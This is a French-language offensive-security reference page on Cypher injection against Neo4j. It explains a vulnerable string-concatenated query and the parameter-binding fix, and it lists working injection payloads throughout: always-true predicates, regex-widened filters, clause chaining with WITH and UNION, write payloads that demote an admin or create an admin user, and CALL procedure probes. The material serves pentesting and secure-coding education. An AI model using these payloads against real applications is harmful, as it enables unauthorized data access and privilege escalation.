---
order: 1
title: "Injection Cypher : entrée non fiable dans les requêtes Neo4j construites par chaîne"
description: "Concaténer l'entrée utilisateur dans les clauses MATCH/WHERE permet à un attaquant d'échapper les littéraux de chaîne, d'inverser des prédicats et de chaîner des clauses Cypher contre Neo4j."
keywords:
  - injection Cypher
  - Neo4j
  - injection MATCH WHERE
  - évasion de littéral de chaîne
  - chaînage de clauses
  - liaison de paramètres
---

# Injection Cypher

Cypher est le langage de requête de Neo4j. Il prend en charge les **paramètres** (`$name`, ou `{name}` dans les drivers plus anciens) que le driver envoie hors-bande par rapport au texte de la requête, mais lorsque le code de l'application construit la requête en concaténant l'entrée utilisateur, l'entrée est analysée comme du Cypher et la requête devient injectable.

## Schéma vulnérable

```javascript
// name taken from the request
const q = "MATCH (u:User) WHERE u.name = '" + name + "' RETURN u";
session.run(q);
```

La forme sûre lie un paramètre (`WHERE u.name = $name` avec `{ name }`) ; la forme injectable interpole la valeur directement dans le littéral de chaîne.

## S'échapper d'un littéral de chaîne

La valeur réside entre guillemets simples, de sorte qu'un guillemet ferme le littéral et le reste est analysé comme syntaxe de requête. Évasion classique toujours vraie :

```
' OR 1=1 //
' OR true RETURN u //
' OR '1'='1
```

`//` met en commentaire jusqu'à la fin de ligne et `/* ... */` met en commentaire un segment, tous deux utilisés pour écarter la partie finale de la requête d'origine (le `' RETURN u` qui suit le point d'injection). Lorsque l'entrée est numérique et sans guillemets, aucun guillemet fermant n'est nécessaire :

```
1 OR 1=1
```

## Altérer les patterns et les prédicats

Au-delà de l'inversion d'un booléen, l'injection réécrit le pattern de graphe. Relâcher un prédicat renvoie des lignes que la requête entendait exclure :

```
admin' OR u.role = 'admin' //
' OR u.name =~ '.*' //
```

`=~` est l'opérateur regex de Cypher ; `.*` matche chaque valeur. `IN`, `CONTAINS`, `STARTS WITH` et `ENDS WITH` sont tout aussi utiles pour élargir un filtre.

## Chaîner des clauses

Cypher permet qu'une requête soit un pipeline de clauses jointes par `WITH`. Après avoir fermé le littéral, ajoutez vos propres clauses. `WITH` transmet les résultats en avant et vous laisse introduire de nouvelles variables, puis un nouveau `MATCH` pivote vers des nœuds sans rapport :

```
' WITH u MATCH (x:User) RETURN x //
' RETURN u UNION MATCH (n) RETURN n //
```

`UNION` combine des jeux de résultats (les noms de colonnes doivent s'aligner ; voir [Extraction de données](data-extraction.md)). Les opérations d'écriture peuvent aussi être atteignables lorsque la session n'est pas en lecture seule :

```
' WITH u MATCH (a:User {name:'admin'}) SET a.role='user' //
' CREATE (:User {name:'pwn', role:'admin'}) //
```

`CALL` est la porte d'entrée vers les procédures, y compris la bibliothèque APOC :

```
' CALL db.labels() YIELD label RETURN label //
```

Voir [Abus de procédures APOC](apoc-procedure-abuse.md) pour les procédures à fort impact.

## Sonder le point d'injection

Soumettez un guillemet isolé (`'`) et guettez une erreur d'analyse Cypher (`Neo.ClientError.Statement.SyntaxError`) qui fuit dans la réponse, un signal fiable que l'entrée atterrit dans le texte de la requête. Comparer `' OR 1=1 //` à `' OR 1=2 //` confirme que le prédicat est évalué. Lorsque les erreurs sont supprimées et qu'aucune ligne n'est reflétée, repliez-vous sur [Injection aveugle](blind-injection.md).

Les littéraux de chaîne Cypher acceptent aussi les échappements (`'` pour un guillemet, `\n`), utiles lorsqu'un filtre retire les guillemets bruts mais transmet la forme échappée à l'analyseur.

## Outils

- **cypher-shell** : tester les évasions de littéral et le chaînage de clauses directement.
- **Burp Repeater** : concevoir et renvoyer des payloads d'évasion via le paramètre.

## Références

- [Neo4j : Cypher parameters](https://neo4j.com/docs/cypher-manual/current/syntax/parameters/)
- [Neo4j : Cypher comments and syntax](https://neo4j.com/docs/cypher-manual/current/)
- [PayloadsAllTheThings : NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
